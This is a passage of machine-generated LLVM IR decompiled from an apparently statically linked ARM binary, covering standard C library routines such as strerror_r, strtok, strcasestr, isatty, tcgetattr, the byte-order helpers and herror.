  %v1_15d38 = add i32 %v0_15d38, 1
  %v1_15d3c = urem i32 %v1_15d38, 4
  %v2_15d3c = icmp eq i32 %v1_15d3c, 0
  br i1 %v2_15d3c, label %dec_label_pc_15d44, label %dec_label_pc_15d24

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d38, %entry
  %v0_15d48 = phi i32 [ %v0_15d3c3, %entry ], [ %v1_15d38, %dec_label_pc_15d38 ]
  %v4_15d44 = mul nuw nsw i32 %v1_15d1c, 256
  %v5_15d44 = or i32 %v4_15d44, %v1_15d1c
  %v4_15d4c = mul i32 %v5_15d44, 65536
  %v5_15d4c = or i32 %v4_15d4c, %v5_15d44
  br label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15dec, %dec_label_pc_15d8c, %dec_label_pc_15d44
  %v0_15db4 = phi i32 [ %v0_15d48, %dec_label_pc_15d44 ], [ %v4_15d50, %dec_label_pc_15d8c ], [ %v4_15d50, %dec_label_pc_15dec ]
  %v1_15d50 = inttoptr i32 %v0_15db4 to i32*
  %v2_15d50 = load i32, i32* %v1_15d50, align 4
  %v4_15d50 = add i32 %v0_15db4, 4
  %v2_15d58 = xor i32 %v2_15d50, %v5_15d4c
  %v2_15d5c = add i32 %v2_15d58, 2130640639
  store i32 %v2_15d5c, i32* @ip, align 4
  %v2_15d64 = add i32 %v2_15d50, 2130640639
  %v1_15d68 = sub i32 -1, %v2_15d50
  %v2_15d6c = xor i32 %v2_15d64, %v1_15d68
  %v2_15d78 = and i32 %v2_15d6c, -2130640640
  %v2_15d80 = icmp eq i32 %v2_15d78, 0
  br i1 %v2_15d80, label %dec_label_pc_15d8c, label %dec_label_pc_15d94

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d50
  %v1_15d74 = sub i32 -1, %v2_15d58
  %v2_15d7c = xor i32 %v2_15d5c, %v1_15d74
  %v2_15d84 = and i32 %v2_15d7c, -2130640640
  %v2_15d8c = icmp eq i32 %v2_15d84, 0
  br i1 %v2_15d8c, label %dec_label_pc_15d50, label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d50, %dec_label_pc_15d8c
  %v2_15d94 = inttoptr i32 %v0_15db4 to i8*
  %v3_15d94 = load i8, i8* %v2_15d94, align 1
  %v4_15d94 = zext i8 %v3_15d94 to i32
  store i32 %v4_15d94, i32* @r3, align 4
  %v9_15d98 = icmp eq i32 %v4_15d94, %v1_15d1c
  br i1 %v9_15d98, label %dec_label_pc_15df8, label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d94
  %v2_15da4 = icmp eq i8 %v3_15d94, 0
  br i1 %v2_15da4, label %dec_label_pc_15df4, label %dec_label_pc_15dac

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15da4
  %v1_15dac = add i32 %v0_15db4, 1
  %v2_15dac = inttoptr i32 %v1_15dac to i8*
  %v3_15dac = load i8, i8* %v2_15dac, align 1
  %v4_15dac = zext i8 %v3_15dac to i32
  store i32 %v4_15dac, i32* @r3, align 4
  %v9_15db0 = icmp eq i32 %v4_15dac, %v1_15d1c
  br i1 %v9_15db0, label %dec_label_pc_15df8, label %dec_label_pc_15dbc

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15dac
  %v2_15dbc = icmp eq i8 %v3_15dac, 0
  br i1 %v2_15dbc, label %dec_label_pc_15df4, label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15dbc
  %v1_15dc4 = add i32 %v0_15db4, 2
  %v2_15dc4 = inttoptr i32 %v1_15dc4 to i8*
  %v3_15dc4 = load i8, i8* %v2_15dc4, align 1
  %v4_15dc4 = zext i8 %v3_15dc4 to i32
  store i32 %v4_15dc4, i32* @r3, align 4
  %v9_15dc8 = icmp eq i32 %v4_15dc4, %v1_15d1c
  br i1 %v9_15dc8, label %dec_label_pc_15df8, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dc4
  %v2_15dd4 = icmp eq i8 %v3_15dc4, 0
  br i1 %v2_15dd4, label %dec_label_pc_15df4, label %dec_label_pc_15ddc

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dd4
  %v1_15ddc = add i32 %v0_15db4, 3
  %v2_15ddc = inttoptr i32 %v1_15ddc to i8*
  %v3_15ddc = load i8, i8* %v2_15ddc, align 1
  %v4_15ddc = zext i8 %v3_15ddc to i32
  store i32 %v4_15ddc, i32* @r3, align 4
  %v9_15de0 = icmp eq i32 %v4_15ddc, %v1_15d1c
  br i1 %v9_15de0, label %dec_label_pc_15df8, label %dec_label_pc_15dec

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15ddc
  %v2_15dec = icmp eq i8 %v3_15ddc, 0
  br i1 %v2_15dec, label %dec_label_pc_15df4, label %dec_label_pc_15d50

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15d30, %dec_label_pc_15dec, %dec_label_pc_15dd4, %dec_label_pc_15dbc, %dec_label_pc_15da4
  br label %dec_label_pc_15df8

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15d24, %dec_label_pc_15ddc, %dec_label_pc_15dc4, %dec_label_pc_15dac, %dec_label_pc_15d94, %dec_label_pc_15df4
  %v1_15dfc = phi i32 [ 0, %dec_label_pc_15df4 ], [ %v1_15ddc, %dec_label_pc_15ddc ], [ %v1_15dc4, %dec_label_pc_15dc4 ], [ %v1_15dac, %dec_label_pc_15dac ], [ %v0_15db4, %dec_label_pc_15d94 ], [ %v0_15d38, %dec_label_pc_15d24 ]
  ret i32 %v1_15dfc

; uselistorder directives
  uselistorder i32 %v4_15d50, { 1, 0 }
  uselistorder i32 %v2_15d50, { 0, 2, 1 }
  uselistorder i32 %v0_15db4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15d44, { 1, 0 }
  uselistorder i32 %v1_15d38, { 1, 0, 2 }
  uselistorder i32 %v0_15d3c3, { 2, 1, 0 }
  uselistorder i32 %v1_15d1c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15df8, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15df4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15d94, { 1, 0 }
  uselistorder label %dec_label_pc_15d24, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15e10 = call i32 @__xpg_strerror_r()
  %v0_15e14 = load i32, i32* @r4, align 4
  ret i32 %v0_15e14
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 25840), i32* @r2, align 4
  %v0_15e38 = call i32 @strtok_r()
  ret i32 %v0_15e38
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15e50 = load i32, i32* @r4, align 4
  %v9_15e50 = load i32, i32* @r6, align 4
  %v0_15e58 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  store i32 %v0_15e58, i32* @ip, align 4
  %v0_15e68 = load i32, i32* @r1, align 4
  store i32 %v0_15e68, i32* @r7, align 4
  %v0_15e6c = load i32, i32* @r2, align 4
  store i32 %v0_15e6c, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_15e58, 124
  br i1 %tmp, label %dec_label_pc_15ea4, label %dec_label_pc_15e74

dec_label_pc_15e74:                               ; preds = %entry
  br label %dec_label_pc_15e8c

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e8c
  br i1 %v2_15e98, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_15e80
  %v2_15e84 = add i32 %v1_15e9c, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_15e80, %bb
  %v0_15e8c1 = phi i32 [ %v1_15e9c, %dec_label_pc_15e80 ], [ %v2_15e84, %bb ]
  %v1_15e88 = add i32 %v0_15e88, 1
  br label %dec_label_pc_15e8c

dec_label_pc_15e8c:                               ; preds = %dec_label_pc_15e74, %bb15
  %v1_15e9c = phi i32 [ %v0_15e58, %dec_label_pc_15e74 ], [ %v0_15e8c1, %bb15 ]
  %v0_15e88 = phi i32 [ add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37456), %dec_label_pc_15e74 ], [ %v1_15e88, %bb15 ]
  store i32 %v0_15e88, i32* @r5, align 4
  %v2_15e8c = icmp eq i32 %v1_15e9c, 0
  %v1_15e90 = inttoptr i32 %v0_15e88 to i8*
  %v2_15e90 = load i8, i8* %v1_15e90, align 1
  %v3_15e90 = zext i8 %v2_15e90 to i32
  store i32 %v3_15e90, i32* @r3, align 4
  %v2_15e98 = icmp eq i8 %v2_15e90, 0
  br i1 %v2_15e8c, label %dec_label_pc_15e98, label %dec_label_pc_15e80

dec_label_pc_15e98:                               ; preds = %dec_label_pc_15e8c
  br i1 %v2_15e98, label %dec_label_pc_15ea4, label %bb16

bb16:                                             ; preds = %dec_label_pc_15e98
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ee0

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e98, %entry
  store i32 %v0_15e58, i32* @r2, align 4
  %v3_15eac = ashr i32 %v0_15e58, 31
  store i32 %v3_15eac, i32* @r3, align 4
  %v6_15ec0 = bitcast i32* %stack_var_-25 to i8*
  %v7_15ec0 = call i32 @_uintmaxtostr(i8* %v6_15ec0)
  %v1_15ec8 = add i32 %v7_15ec0, -14
  store i32 %v1_15ec8, i32* @r5, align 4
  %v0_15ecc = load i32, i32* @r6, align 4
  %v2_15ecc = add i32 %v0_15ecc, -37472
  store i32 %v2_15ecc, i32* @r1, align 4
  store i32 %v1_15ec8, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_15ed8 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_15ee0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15ee0

dec_label_pc_15ee0:                               ; preds = %bb16, %dec_label_pc_15ea4
  %v0_15ee0 = phi i32 [ %v0_15e88, %bb16 ], [ %v0_15ee0.pre, %dec_label_pc_15ea4 ]
  %v1_15ee0 = inttoptr i32 %v0_15ee0 to i8*
  %v3_15ee4 = call i32 @strlen(i8* %v1_15ee0)
  %v0_15ee8 = load i32, i32* @r7, align 4
  %v2_15ee8 = icmp eq i32 %v0_15ee8, 0
  br i1 %v2_15ee8, label %bb17, label %dec_label_pc_15ee0._crit_edge

dec_label_pc_15ee0._crit_edge:                    ; preds = %dec_label_pc_15ee0
  %v1_15ef4.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_15ee0
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15ee0._crit_edge, %bb17
  %v1_15ef4 = phi i32 [ %v1_15ef4.pre, %dec_label_pc_15ee0._crit_edge ], [ 0, %bb17 ]
  %v1_15ef0 = add i32 %v3_15ee4, 1
  %v3_15ef4 = icmp uge i32 %v1_15ef0, %v1_15ef4
  %v9_15ef4 = icmp eq i32 %v1_15ef0, %v1_15ef4
  %v2_15ef8 = xor i1 %v3_15ef4, true
  %v3_15ef8 = or i1 %v9_15ef4, %v2_15ef8
  br i1 %v3_15ef8, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_15ef0, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_15f08 = phi i32 [ %v1_15ef4, %bb18 ], [ %v1_15ef0, %bb19 ]
  %v2_15efc = xor i1 %v9_15ef4, true
  %v3_15efc = and i1 %v3_15ef4, %v2_15efc
  br i1 %v3_15efc, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_15f00 = icmp eq i32 %v0_15f08, 0
  br i1 %v2_15f00, label %dec_label_pc_15f24, label %dec_label_pc_15f08

dec_label_pc_15f08:                               ; preds = %bb22
  store i32 %v0_15f08, i32* @r2, align 4
  %v0_15f0c = load i32, i32* @r5, align 4
  store i32 %v0_15f0c, i32* @r1, align 4
  store i32 %v0_15ee8, i32* @r0, align 4
  %v0_15f14 = call i32 @memcpy()
  %v0_15f18 = load i32, i32* @r4, align 4
  %v1_15f18 = load i32, i32* @r7, align 4
  %v2_15f18 = add i32 %v1_15f18, %v0_15f18
  %v3_15f20 = add i32 %v2_15f18, -1
  %v4_15f20 = inttoptr i32 %v3_15f20 to i8*
  store i8 0, i8* %v4_15f20, align 1
  br label %dec_label_pc_15f24

dec_label_pc_15f24:                               ; preds = %bb22, %dec_label_pc_15f08
  %v0_15f24 = load i32, i32* %r6.global-to-local, align 4
  %v2_15f24 = icmp eq i32 %v0_15f24, 0
  br i1 %v2_15f24, label %dec_label_pc_15f34, label %dec_label_pc_15f2c

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f24
  %v0_15f2c = call i32 @__GI___errno_location()
  %v0_15f30 = load i32, i32* %r6.global-to-local, align 4
  %v2_15f30 = inttoptr i32 %v0_15f2c to i32*
  store i32 %v0_15f30, i32* %v2_15f30, align 4
  %v0_15f34.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15f24, %dec_label_pc_15f2c
  %v0_15f34 = phi i32 [ 0, %dec_label_pc_15f24 ], [ %v0_15f34.pre, %dec_label_pc_15f2c ]
  store i32 %v3_15e50, i32* @r4, align 4
  store i32 %v9_15e50, i32* %r6.global-to-local, align 4
  ret i32 %v0_15f34

; uselistorder directives
  uselistorder i1 %v3_15ef4, { 1, 0 }
  uselistorder i32 %v0_15e88, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15e9c, { 1, 0, 2 }
  uselistorder i32 %v0_15e58, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_15f34, { 1, 0 }
  uselistorder label %dec_label_pc_15f24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15ee0, { 1, 0 }
  uselistorder label %dec_label_pc_15e8c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_15f5c = load i32, i32* %r0.global-to-local, align 4
  %v1_15f7023 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15f70.outer

dec_label_pc_15f70.outer:                         ; preds = %dec_label_pc_15fb0, %entry
  %v0_15fb0.ph = phi i32 [ %v1_15fb0, %dec_label_pc_15fb0 ], [ %v0_15f5c, %entry ]
  %v2_15f7024 = load i8, i8* %v1_15f7023, align 1
  %v2_15f7426 = icmp eq i8 %v2_15f7024, 0
  br i1 %v2_15f7426, label %bb, label %dec_label_pc_15f88

bb:                                               ; preds = %dec_label_pc_15f70.backedge, %dec_label_pc_15f70.outer
  store i32 %v0_15fb0.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fc4

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f70.outer, %dec_label_pc_15f70.backedge
  %v1_15f7c32.in = phi i32 [ %v1_15f7c32, %dec_label_pc_15f70.backedge ], [ %arg2, %dec_label_pc_15f70.outer ]
  %v2_15f7030 = phi i8 [ %v2_15f70, %dec_label_pc_15f70.backedge ], [ %v2_15f7024, %dec_label_pc_15f70.outer ]
  %v2_15f7831.in.in = phi i8 [ %v2_15f70, %dec_label_pc_15f70.backedge ], [ %v2_15f7024, %dec_label_pc_15f70.outer ]
  %v0_15f9429 = phi i32 [ %v1_15f94, %dec_label_pc_15f70.backedge ], [ %v0_15fb0.ph, %dec_label_pc_15f70.outer ]
  %v1_15f7c32 = add i32 %v1_15f7c32.in, 1
  %v1_15f88 = inttoptr i32 %v0_15f9429 to i8*
  %v2_15f88 = load i8, i8* %v1_15f88, align 1
  %v3_15f88 = zext i8 %v2_15f88 to i32
  store i32 %v3_15f88, i32* %r0.global-to-local, align 4
  %v9_15f8c = icmp eq i8 %v2_15f7030, %v2_15f88
  %v1_15f94 = add i32 %v0_15f9429, 1
  br i1 %v9_15f8c, label %dec_label_pc_15f70.backedge, label %dec_label_pc_15f9c

dec_label_pc_15f70.backedge:                      ; preds = %dec_label_pc_15f88, %dec_label_pc_15f9c
  %v1_15f70 = inttoptr i32 %v1_15f7c32 to i8*
  %v2_15f70 = load i8, i8* %v1_15f70, align 1
  %v2_15f74 = icmp eq i8 %v2_15f70, 0
  br i1 %v2_15f74, label %bb, label %dec_label_pc_15f88

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f88
  %v2_15f7831.in = zext i8 %v2_15f7831.in.in to i32
  %v2_15f90 = mul nuw nsw i32 %v3_15f88, 2
  %v2_15f7831 = mul nuw nsw i32 %v2_15f7831.in, 2
  %v4_15f9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 1172) to i32*), align 4
  %v2_15fa0 = add i32 %v4_15f9c, %v2_15f90
  %v3_15fa0 = inttoptr i32 %v2_15fa0 to i16*
  %v4_15fa0 = load i16, i16* %v3_15fa0, align 2
  %v2_15fa4 = add i32 %v4_15f9c, %v2_15f7831
  %v3_15fa4 = inttoptr i32 %v2_15fa4 to i16*
  %v4_15fa4 = load i16, i16* %v3_15fa4, align 2
  %v9_15fa8 = icmp eq i16 %v4_15fa4, %v4_15fa0
  br i1 %v9_15fa8, label %dec_label_pc_15f70.backedge, label %dec_label_pc_15fb0

dec_label_pc_15fb0:                               ; preds = %dec_label_pc_15f9c
  %v1_15fb0 = add i32 %v0_15fb0.ph, 1
  %v2_15fb4 = icmp eq i8 %v2_15f88, 0
  br i1 %v2_15fb4, label %dec_label_pc_15fc4, label %dec_label_pc_15f70.outer

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_15fb0, %bb
  %v1_15fc8 = phi i32 [ %v0_15fb0.ph, %bb ], [ 0, %dec_label_pc_15fb0 ]
  ret i32 %v1_15fc8

; uselistorder directives
  uselistorder i8 %v2_15f70, { 2, 1, 0 }
  uselistorder i32 %v0_15f9429, { 1, 0 }
  uselistorder i32 %v0_15fb0.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15f70.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15f88, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_15fdc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15fdc, i32* @r1, align 4
  %v0_15fe0 = call i32 @__GI_tcgetattr()
  %v1_15fe4 = sub i32 1, %v0_15fe0
  %v2_15fe4 = icmp ult i32 %v0_15fe0, 2
  br i1 %v2_15fe4, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_15ff4 = phi i32 [ %v1_15fe4, %entry ], [ 0, %bb ]
  ret i32 %v1_15ff4

; uselistorder directives
  uselistorder i32 %v0_15fe0, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15ff8 = load i32, i32* @r4, align 4
  %v6_15ff8 = load i32, i32* @r5, align 4
  %v2_16000 = ptrtoint i32* %stack_var_-52 to i32
  %v0_16004 = load i32, i32* @r1, align 4
  store i32 %v0_16004, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_16010 = load i32, i32* @r0, align 4
  %v3_16010 = call i32 @ioctl(i32 %v0_16010, i32 21505, i32 %v2_16000)
  store i32 %v3_16010, i32* %r0.global-to-local, align 4
  store i32 %v3_16010, i32* @r5, align 4
  %v2_16014 = icmp eq i32 %v3_16010, 0
  br i1 %v2_16014, label %dec_label_pc_1601c, label %dec_label_pc_16060

dec_label_pc_1601c:                               ; preds = %entry
  %v4_16028 = zext i8 %tmp to i32
  store i32 %v4_16028, i32* @ip, align 4
  %v3_1602c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_1602c, i32* @r3, align 4
  %v1_16030 = load i32, i32* @r4, align 4
  %v2_16030 = add i32 %v1_16030, 4
  %v3_16030 = inttoptr i32 %v2_16030 to i32*
  %v0_16034 = load i32, i32* %r1.global-to-local, align 4
  %v1_16034 = load i32, i32* @r4, align 4
  %v2_16034 = add i32 %v1_16034, 8
  %v3_16034 = inttoptr i32 %v2_16034 to i32*
  store i32 %v0_16034, i32* %v3_16034, align 4
  %v0_16038 = load i32, i32* %r0.global-to-local, align 4
  %v1_16038 = load i32, i32* @r4, align 4
  %v2_16038 = add i32 %v1_16038, 12
  %v3_16038 = inttoptr i32 %v2_16038 to i32*
  store i32 %v0_16038, i32* %v3_16038, align 4
  %v2_1603c = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_1603c, i32* @r1, align 4
  %v1_16044 = load i32, i32* @r4, align 4
  %v2_16044 = inttoptr i32 %v1_16044 to i32*
  store i32 %v3_1602c, i32* %v2_16044, align 4
  %v0_16048 = load i32, i32* @ip, align 4
  %v1_16048 = trunc i32 %v0_16048 to i8
  %v2_16048 = load i32, i32* @r4, align 4
  %v3_16048 = add i32 %v2_16048, 16
  %v4_16048 = inttoptr i32 %v3_16048 to i8*
  store i8 %v1_16048, i8* %v4_16048, align 1
  %v0_1604c = load i32, i32* @r4, align 4
  %v1_1604c = add i32 %v0_1604c, 17
  store i32 %v1_1604c, i32* %r0.global-to-local, align 4
  %v4_16050 = call i32 @__GI_mempcpy(i32 %v1_1604c, i32 %v2_1603c, i32 19, i32 %v3_1602c)
  store i32 %v4_16050, i32* %r0.global-to-local, align 4
  %v0_16054 = load i32, i32* @r5, align 4
  store i32 %v0_16054, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_1605c = inttoptr i32 %v4_16050 to i8*
  %v3_1605c = call i32 @__GI_memset(i8* %v2_1605c, i32 %v0_16054)
  store i32 %v3_1605c, i32* %r0.global-to-local, align 4
  %v0_16060.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16060

dec_label_pc_16060:                               ; preds = %entry, %dec_label_pc_1601c
  %v0_16060 = phi i32 [ %v3_16010, %entry ], [ %v0_16060.pre, %dec_label_pc_1601c ]
  store i32 %v0_16060, i32* %r0.global-to-local, align 4
  store i32 %v3_15ff8, i32* @r4, align 4
  store i32 %v6_15ff8, i32* @r5, align 4
  ret i32 %v0_16060

; uselistorder directives
  uselistorder i32 %v0_16060, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_16060, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_16074 = udiv i32 %arg1, 256
  %v1_16078 = mul i32 %arg1, 256
  %v4_1607c = and i32 %v1_16078, 65280
  %v5_1607c = or i32 %v4_1607c, %v3_16074
  ret i32 %v5_1607c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_1609c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_1609c
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_160a4 = udiv i32 %arg1, 256
  %v1_160a8 = mul i32 %arg1, 256
  %v4_160ac = and i32 %v1_160a8, 65280
  %v5_160ac = or i32 %v4_160ac, %v3_160a4
  ret i32 %v5_160ac
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_160cc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_160cc
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %dec_label_pc_160f4, label %dec_label_pc_160e8

dec_label_pc_160e8:                               ; preds = %entry
  ret i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34432)

dec_label_pc_160f4:                               ; preds = %entry
  %v4_160fc = mul i32 %arg1, 4
  %v5_160fc = add i32 %v4_160fc, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -20)
  %v6_160fc = inttoptr i32 %v5_160fc to i32*
  %v7_160fc = load i32, i32* %v6_160fc, align 4
  ret i32 %v7_160fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
  %v3_16118 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  br i1 %v3_16118, label %dec_label_pc_1613c, label %dec_label_pc_16128

dec_label_pc_16128:                               ; preds = %entry
  %v2_16128 = load i8, i8* %arg1, align 1
  %v2_1612c = icmp eq i8 %v2_16128, 0
  br i1 %v2_1612c, label %dec_label_pc_1613c, label %dec_label_pc_16148

dec_label_pc_1613c:                               ; preds = %dec_label_pc_16128, %entry
  br label %dec_label_pc_16148

dec_label_pc_16148:                               ; preds = %dec_label_pc_16128, %dec_label_pc_1613c
  %storemerge = phi i32 [ add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34414), %dec_label_pc_1613c ], [ add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34416), %dec_label_pc_16128 ]
  store i32 %storemerge, i32* @r6, align 4
  %v0_16148 = call i32 @__GI___h_errno_location()
  %v1_1614c = inttoptr i32 %v0_16148 to i32*
  %v2_1614c = load i32, i32* %v1_1614c, align 4
  %v2_16150 = icmp ugt i32 %v2_1614c, 3
  %v7_16150 = icmp eq i32 %v2_1614c, 4
  %v2_16154 = xor i1 %v7_16150, true
  %v3_16154 = and i1 %v2_16150, %v2_16154
  br i1 %v3_16154, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16148
  %v4_16158 = load i32, i32* @r4, align 4
  %v6_16158 = add i32 %v4_16158, -34432
  store i32 %v6_16158, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16148, %bb
  %v2_1615c = xor i1 %v2_16150, true
  %v3_1615c = or i1 %v7_16150, %v2_1615c
  br i1 %v3_1615c, label %bb16, label %._crit_edge

._crit_edge:                                      ; preds = %.thread4
  %v0_16184.pre = load i32, i32* @ip, align 4
  %v0_16170.pre = load i32, i32* @r4, align 4
  br label %bb17

bb16:                                             ; preds = %.thread4
  %v4_16160 = load i32, i32* @r4, align 4
  %v6_16160 = add i32 %v4_16160, -20
  %v8_16164 = mul i32 %v2_1614c, 4
  %v9_16164 = add i32 %v6_16160, %v8_16164
  %v10_16164 = inttoptr i32 %v9_16164 to i32*
  %v11_16164 = load i32, i32* %v10_16164, align 4
  store i32 %v11_16164, i32* @ip, align 4
  br label %bb17

bb17:                                             ; preds = %._crit_edge, %bb16
  %v0_16170 = phi i32 [ %v0_16170.pre, %._crit_edge ], [ %v4_16160, %bb16 ]
  %v0_16184 = phi i32 [ %v0_16184.pre, %._crit_edge ], [ %v11_16164, %bb16 ]
  %v2_16170 = add i32 %v0_16170, 96
  %v3_16170 = inttoptr i32 %v2_16170 to i32*
  %v4_16170 = load i32, i32* %v3_16170, align 4
  %v2_16174 = add i32 %v0_16170, -34548
  %v1_16178 = inttoptr i32 %v4_16170 to i32*
  %v2_16178 = load i32, i32* %v1_16178, align 4
  store i32 %v2_16178, i32* @r0, align 4
  %v0_1617c = load i32, i32* @r5, align 4
  %v0_16180 = load i32, i32* @r6, align 4
  %v6_16188 = call i32 @fprintf(i32 %v2_16178, i32 %v2_16174, i32 %v0_1617c, i32 %v0_16180, i32 %v0_16184)
  ret i32 %v6_16188

; uselistorder directives
  uselistorder i32 %v0_16170, { 1, 0 }
  uselistorder i1 %v7_16150, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_16148, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_161b0 = load i32, i32* @r4, align 4
  %v6_161b0 = load i32, i32* @r5, align 4
  %v9_161b0 = load i32, i32* @r6, align 4
  %v12_161b0 = load i32, i32* @r7, align 4
  %v15_161b0 = load i32, i32* @r8, align 4
  %v18_161b0 = load i32, i32* @sb, align 4
  %v21_161b0 = load i32, i32* @sl, align 4
  %v24_161b0 = load i32, i32* @fp, align 4
  %v0_161b4 = load i32, i32* @r0, align 4
  %v5_161d0 = call i32 @llvm.bswap.i32(i32 %v0_161b4)
  %v0_161d4 = load i32, i32* @r1, align 4
  %v1_161d4 = add i32 %v0_161d4, 15
  store i32 %v1_161d4, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
